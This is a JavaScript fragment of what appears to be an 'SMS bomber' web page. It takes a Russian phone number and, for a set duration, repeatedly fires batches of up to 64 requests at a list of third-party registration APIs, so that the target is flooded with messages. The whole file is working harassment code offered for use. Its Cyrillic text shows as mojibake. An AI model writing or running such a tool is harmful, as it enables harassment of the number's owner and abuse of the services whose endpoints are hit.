    let isRunning = false;
    let stopFlag = false;

    async function sendApi(api, phone) {
      if (stopFlag) return;
      
      try {
        const isGet = api.method === "GET";
        const url = isGet ? api.url + api.bodyT(phone) : api.url;
        const init = {
          method: api.method,
          mode: "no-cors",
          credentials: "omit",
          headers: api.headers
        };
        if (!isGet) {
          init.body = api.name === "naomisushi-register" ? api.bodyT(phone, "") : api.bodyT(phone);
        }

        await fetch(url, init);
        return `‚úÖ ${api.name}`;
      } catch (e) {
        return `‚ùå ${api.name}`;
      }
    }

    async function startSpam() {
      const phone = document.getElementById("phone").value.trim();
      const duration = parseInt(document.getElementById("duration").value) || 10;
      const threads = parseInt(document.getElementById("threads").value) || 64;

      if (!phone || !/^\+7\d{10}$/.test(phone)) {
        alert("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ +79991234567");
        return;
      }

      const log = document.getElementById("log");
      const startBtn = document.getElementById("startBtn");
      const stopBtn = document.getElementById("stopBtn");

      startBtn.disabled = true;
      stopBtn.disabled = false;
      log.textContent = "üöÄ –ó–∞–ø—É—Å–∫...\n";
      isRunning = true;
      stopFlag = false;

      const totalApis = apis().length;
      const startTime = Date.now();

      while (isRunning && (Date.now() - startTime) < duration * 1000) {
        if (stopFlag) break;

        const batch = [];
        for (let i = 0; i < threads && i < totalApis; i++) {
          const api = apis()[i];
          batch.push(sendApi(api, phone));
        }

        const results = await Promise.all(batch);
        results.forEach(result => {
          log.textContent += result + "\n";
          log.scrollTop = log.scrollHeight;
        });

        // –û–∂–∏–¥–∞–Ω–∏–µ –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–µ–π –∏—Ç–µ—Ä–∞—Ü–∏–µ–π
        await new Promise(r => setTimeout(r, 500));
      }

      isRunning = false;
      stopFlag = false;
      startBtn.disabled = false;
      stopBtn.disabled = true;
